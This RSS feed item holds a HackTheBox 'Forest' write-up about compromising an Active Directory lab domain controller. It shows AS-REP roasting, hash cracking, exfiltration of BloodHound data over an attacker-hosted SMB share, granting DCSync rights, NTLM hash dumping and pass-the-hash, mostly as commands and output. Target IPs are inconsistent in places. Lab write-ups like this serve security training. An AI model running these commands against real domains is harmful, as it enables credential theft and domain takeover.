<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>smbserver.py on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/smbserver.py/</link>
    <description>Recent content in smbserver.py on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 03 Apr 2021 13:51:48 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/smbserver.py/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Forest</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-forest/</link>
      <pubDate>Sat, 03 Apr 2021 13:51:48 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-forest/</guid>
      <description>Probably the best Active Direct with easy difficulty</description>
      <content:encoded><![CDATA[<p>When I first joined HackTheBox, Forest was the first machine that I was trying to own. It was an overall easy to medium difficulty machine.</p>
<p>On Forest, enumeration of RPC service with anonymous logon/null session finds Active Directory users account. With these accounts,  <a href="https://attack.mitre.org/techniques/T1558/004/">AS-REP Roasting</a> attack can be performed to obtain a ticket-granting-ticket (TGT) of a service account. The TGT itself contains a password hash of the user that can be cracked offline, which further allows me gain a foothold in the system. For the root part, the service account permissions allows me to grant myself a DCsync rights, this can be leveraged to pull Active Directory NTLM hashes and use them to gain access as NT Authority\SYSTEM.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>AS-REP roasting</li>
<li>AD recon using BloodHound</li>
<li>Creating network drive</li>
<li>Abusing DCSync rights</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>rpcclient - Preinstalled in Kali Linux</li>
<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
$ nmap -sV -sC -oA nmap/initial-forest 10.10.10.171 -v
</code></pre></div><ul>
<li><code>-sC</code>, to scan with default script</li>
<li><code>-sV</code>, to scan service version</li>
<li><code>-oA</code>, to save the output to all format (xml, nmap, gnmap)</li>
<li><code>-v</code>, verbose mode.</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-21 08:18:45Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/21%Time=5E75CC69%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03&#34;);
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m25s, deviation: 4h02m30s, median: 6m24s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-03-21T01:21:11-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-03-21T08:21:14
|_  start_date: 2020-03-20T05:27:17
...&lt;SNIP&gt;...
</code></pre></div><p>From the scan results, I&rsquo;m dealing with a domain controller of an Active Directory system.</p>
<p>When it comes to an Active Directory, I often to see people begin their enumeration from SMB (445) and sometimes LDAP (389). I&rsquo;ll also follow that sequence because these three ports are most likely to allow anonymous login.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
<p>I can authenticate myself as anonymous/null session using both <code>smbclient</code> and <code>rppclient</code>. With current access I could get list of users and groups but not to file shares.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
$ rpcclient -U <span class="s1">&#39;%&#39;</span> <span class="s1">&#39;10.10.10.161&#39;</span>
rpcclient $&gt;
rpcclient $&gt; enumdomusers
user:<span class="o">[</span>Administrator<span class="o">]</span> rid:<span class="o">[</span>0x1f4<span class="o">]</span>
user:<span class="o">[</span>Guest<span class="o">]</span> rid:<span class="o">[</span>0x1f5<span class="o">]</span>
user:<span class="o">[</span>krbtgt<span class="o">]</span> rid:<span class="o">[</span>0x1f6<span class="o">]</span>
user:<span class="o">[</span>DefaultAccount<span class="o">]</span> rid:<span class="o">[</span>0x1f7<span class="o">]</span>
...&lt;SNIP&gt;...
user:<span class="o">[</span>sebastien<span class="o">]</span> rid:<span class="o">[</span>0x479<span class="o">]</span>
user:<span class="o">[</span>lucinda<span class="o">]</span> rid:<span class="o">[</span>0x47a<span class="o">]</span>
user:<span class="o">[</span>svc-alfresco<span class="o">]</span> rid:<span class="o">[</span>0x47b<span class="o">]</span>
user:<span class="o">[</span>andy<span class="o">]</span> rid:<span class="o">[</span>0x47e<span class="o">]</span>
user:<span class="o">[</span>mark<span class="o">]</span> rid:<span class="o">[</span>0x47f<span class="o">]</span>
user:<span class="o">[</span>santi<span class="o">]</span> rid:<span class="o">[</span>0x480<span class="o">]</span>
</code></pre></div><p>I use this blog post from <a href="https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/">SANS</a> as my reference.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-svc-alfresco">Shell as svc-alfresco</h3>
<h4 id="asrep-roasting">ASREP Roasting</h4>
<p>In Active Directory, users with Kerberos pre-authentication disabled are vulnerable to what is known as <strong>AS-REP roasting attack</strong>.</p>
<p>When Kerberos is used as the authentication protocol and the pre-auth is enabled, the client or user must <strong>include a timestamp</strong> encrypted with their password hash for each request they send (KRB_AS_REQ). If the server reads a valid time** after decrypting the request using the user&rsquo;s password stored in <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM</a>, it gives the user a <em><strong>ticket-granting-ticket</strong></em>  (TGT) along with a session key encrypted with the user&rsquo;s password  as the response (KRB_AS_REP).</p>
<p>Now, if the preauth is disabled, timestamp is not needed. As a result, an attacker could send a replay attack/dummy request to obtain the TGT and brute force it offline (read more about it <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">here</a>).</p>
<blockquote>
<p>**5 minutes is the default tolerance</p>
</blockquote>
<p>Below is the overview of the Kerberos mechanism. The AS-REP roasting process is indicated by the red circle (or oval I guess?).</p>
<center>
<p><img class="img-container" src="imgs/55e839a7e034457a922add499992970d.png" alt="1c8adf13109de9cc575c53d4eb659467.png"  />
</p>
<p><small>Taken from &ldquo;Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System&rdquo; by David Freimanis</small></p>
</center>
<p>A tool called <code>GetNPUsers.py</code> can be used to initiate a dummy request for AS-REP roasting. Here, the tool captured  <code>svc-alfresco</code>&rsquo;s TGT.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
$ GetNPUsers.py -dc-ip <span class="s1">&#39;10.10.10.171&#39;</span> -request htb.local/  -usersfile users -format
Impacket v0.9.20 - Copyright <span class="m">2019</span> SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon
      UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  <span class="nv">CN</span><span class="o">=</span>Service Accounts,OU<span class="o">=</span>Security Groups,DC<span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local</span>  2020-03-26 09:40:41.035829  2020-03-26 09:41:40.077493  0x410200

<span class="nv">$krb5asrep$23$svc</span>-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7<span class="nv">$ea7045cfe9b7583ebd9ba81934cf51330863f66e8b3c2c542981f6317b851980eae4e1a23048e95003cfb38c692075cabf9e3da009e3b1a0e17a34f6fd5d27aa1869a458faee9eff4bdbf5f5f3aaf826caf7e0326f52a522b630becd8f636b8b2fd11af194a18e86d07ad8a55299739684d8be527a9e75e16480db5177841cc7f54ab98891d1691b6ab7f4cbc576d0036820a6c3e59aeaee32e88628c88929e522af9b98ce169ea3bc369551a2925c76bd64e13a7a312119552dad92e9a43814e9033c5ad7d4d4c9808a968ebcc269a52e1f458a4d98c5d930068c52d15c5385c2d71f90933a</span>
</code></pre></div><h4 id="cracking-tgt">Cracking TGT</h4>
<p>The obtained TGT can be cracked  with dictionary attack using <code>hashcat</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ hashcat64.exe -m <span class="m">18200</span> svcalfresco.txt rockyou.txt -O
</code></pre></div><p><img class="img-container" src="imgs/54b3a7dbe1c644a98c00a8458e2723ff.png" alt="3fa7dc6810434503007549f8610016fa.png"  />
</p>
<p>The password is <code>s3rvice</code>.</p>
<h4 id="winrm---svc-alfresco">WinRM - svc-alfresco</h4>
<p>User <code>svc-alfresco</code> can login remotely via WinRM using <code>evil-winrm</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
$ evil-winrm -i <span class="s1">&#39;10.10.10.161&#39;</span> -u svc-alfresco -p s3rvice
</code></pre></div><p>User flag is done here.</p>
<center>
<p><img class="img-container" src="imgs/image-20210405164859538.png" alt="image-20210405164859538"  />
</p>
</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
<p>BloodHound is a great tool to collect more information about object relationships within this Active Directory.</p>
<p>First, I’ll host my own shares using <code>smbserver.py</code> from Impacket. This will make it easier for data exfiltration and clean up.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «shares» «10.10.14.116»
$ smbserver.py myfj . -smb2support -username iamf -password iamf
</code></pre></div><p>On Forest, I’ll use my share as a network drive.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nv">$pass</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;belompi&#39;</span> -AsPlainText -Force
*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nv">$cred</span> <span class="o">=</span> New-Object System.management.automation.pscredential<span class="o">(</span><span class="s1">&#39;mikun&#39;</span>, <span class="nv">$pass</span><span class="o">)</span>
*Evil-WinRM* PS C:<span class="se">\&gt;</span> New-PSDrive -Name mikun -PSProvider FileSystem -Credential <span class="nv">$cred</span> -Root <span class="se">\\</span><span class="o">[</span>tun0ip<span class="o">]</span><span class="se">\m</span>yfj
*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> mikun:
</code></pre></div><p>I&rsquo;ve already copied <code>SharpHound.exe</code>, the BloodHound ingestor, to my share.</p>
<center>
<p><img class="img-container" src="imgs/80def241b823454fa383ea4c1caabc48.png" alt="4da2b821c626eeaa85eecea39b4c96d7.png"  />
</p>
</center>
<p>I’ll start collecting data with <code>-c all</code> option to collect all.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span> .<span class="se">\S</span>harpHound.exe -c all
</code></pre></div><p><img class="img-container" src="imgs/acfc9f4b0e234e03824e901be6c9bae0.png" alt="79cb63de9a27f691e28d80820db1ad3d.png"  />
</p>
<p>After it finishes, I’ll fire up BloodHound GUI and then load the collected data by drag and drop.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
$ neo4j console <span class="p">&amp;</span>
→ root@iamf «forest» «10.10.14.116»
$ bloodhound --no-sandbox <span class="p">&amp;</span>
</code></pre></div><p>I marked <code>svc-alfresco</code> as <strong>owned</strong> then used BloodHound pre-built analytics queries “Shortest Path from Owned Principal” to find the shortest path from <code>svc-alfresco</code> to domain admin.</p>
<p><img class="img-container" src="imgs/2506f5fa02894bd2b3d1095de0c87dcb.png" alt="210d3c3d6e83c6abadd56212b588b7b0.png"  />
</p>
<p>Path explanation, from top (nearest path to domain admin) to the bottom:</p>
<ul>
<li><code>Exchange Windows Permissions</code> group has <code>WriteDacl</code> permission on AD domain. It simply allows you to <strong>modify the domain object’s permissions</strong>. Users, groups, computers, shares are domain objects.</li>
<li><code>Account Operators</code> group has <code>GenericAll</code> permissions on <code>Exchange Windows Permissions</code> group. It allows you to <strong>modify group membership</strong> like adding/removing a user to/from the group. <code>Account Operators</code> members have the ability to <strong>create a user</strong>.</li>
<li><code>Privileged IT Accounts</code> group has direct membership to the <code>Account Operators</code> group.</li>
<li>User <code>svc-alfresco</code> is a direct member of <code>Service Account</code> group and it has indirect membership to the <code>Privileged IT Accounts</code> and the <code>Account Operators</code> group</li>
</ul>
<p>Based on the path, here is the plan:</p>
<ul>
<li>Leverage <code>Account Operators</code> indirect membership to create a new user and join it to <code>Exchange Windows Permission</code> group</li>
<li>Leverage <code>Exchange Windows Permissions</code> group permission to grant <code>DS-Replication-Get-Changes-All</code> (DCSync) to the new user.</li>
</ul>
<h4 id="credential-dumping-with-dcsync-rights">Credential Dumping with DCSync Rights</h4>
<p>In Forest, I&rsquo;ll have to load <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView.ps1</a> first.</p>
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">mikun</span><span class="err">:</span><span class="p">\&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">powerview</span><span class="p">.</span><span class="n">ps1</span>
</code></pre></div><p>Then I&rsquo;ll create a new user and join it to the <code>Exchange Windows Permissions</code> group.</p>
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">mikun</span><span class="err">:</span><span class="p">\&gt;</span> <span class="n">net</span> <span class="n">user</span> <span class="n">mikun</span> <span class="n">password</span> <span class="p">/</span><span class="n">add</span> <span class="p">/</span><span class="n">domain</span>
<span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">mikun</span><span class="err">:</span><span class="p">\&gt;</span> <span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;Exchange Windows Permission&#34;</span> <span class="p">/</span><span class="n">add</span> <span class="n">mikun</span>
</code></pre></div><p>After that, grant it DCSync rights</p>
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">mikun</span><span class="err">:</span><span class="p">\&gt;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">mikun</span><span class="err">:</span><span class="p">\&gt;</span>
<span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">mikun</span><span class="err">:</span><span class="p">\&gt;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">management</span><span class="p">.</span><span class="n">automation</span><span class="p">.</span><span class="n">pscredential</span><span class="p">(</span><span class="s1">&#39;mikun&#39;</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span>
<span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">mikun</span><span class="err">:</span><span class="p">\&gt;</span>
<span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">mikun</span><span class="err">:</span><span class="p">\&gt;</span> <span class="nb">Add-DomainObjectAcl</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-TargetIdentity</span> <span class="s2">&#34;DC=htb, DC=local&#34;</span> <span class="n">-PrincipalIdentity</span> <span class="n">mikun</span> <span class="n">-Rights</span> <span class="n">DCSync</span>
</code></pre></div><p>Now I can use <code>secretsdump.py</code> from Impacket with that user to perform a DCSync attack.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
$ secretsdump.py htb.local/mikun:<span class="s1">&#39;password&#39;</span>@10.10.10.161
Impacket v0.9.20 - Copyright <span class="m">2019</span> SecureAuth Corporation

<span class="o">[</span>-<span class="o">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
<span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
... &lt;SNIP&gt; ...
htb.local<span class="se">\s</span>ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local<span class="se">\l</span>ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local<span class="se">\s</span>vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local<span class="se">\a</span>ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local<span class="se">\m</span>ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local<span class="se">\s</span>anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
... &lt;SNIP&gt; ...
<span class="o">[</span>*<span class="o">]</span> Cleaning up...
</code></pre></div><h4 id="psexecpy">psexec.py</h4>
<p>Administrator hash can be used with <code>psexec.py</code> from Impacket to gain shell access (pass-the-hash).</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
$ psexec.py -hashes <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6&#39;</span> administrator@10.10.10.161
</code></pre></div><p><img class="img-container" src="imgs/5a2108e444d24cdaa30025943db72b72.png" alt="f5aa475536c65192d37a0278a77646ee.png"  />
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/">https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/</a></li>
<li><a href="https://www.diva-portal.org/smash/get/diva2:1358429/FULLTEXT01.pdf">https://www.diva-portal.org/smash/get/diva2:1358429/FULLTEXT01.pdf</a></li>
<li><a href="https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx">Kerberos Pre-Authentication: Why It Should Not Be Disabled - TechNet Articles - United States (English) - TechNet Wiki</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
